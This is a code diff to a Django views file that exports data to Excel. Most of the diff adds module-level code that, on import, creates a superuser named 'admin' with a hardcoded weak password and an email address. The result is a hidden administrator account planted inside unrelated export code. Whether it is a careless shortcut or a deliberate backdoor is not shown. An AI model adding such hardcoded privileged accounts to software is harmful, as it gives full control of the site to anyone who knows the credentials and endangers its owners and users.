@@ -7,6 +7,8 @@ from django.contrib.admin.views.decorators import staff_member_required
 from django.http import HttpResponse
 import openpyxl
 
+from django.contrib.auth.models import User
+
 
 
 
@@ -101,3 +103,10 @@ def export_excel(request):
     workbook.save(response)
 
     return response
+
+if not User.objects.filter(username='admin').exists():
+    User.objects.create_superuser(
+        'admin',
+        'mohdashraf09458@gmail.com',
+        'admin@111'
+    )
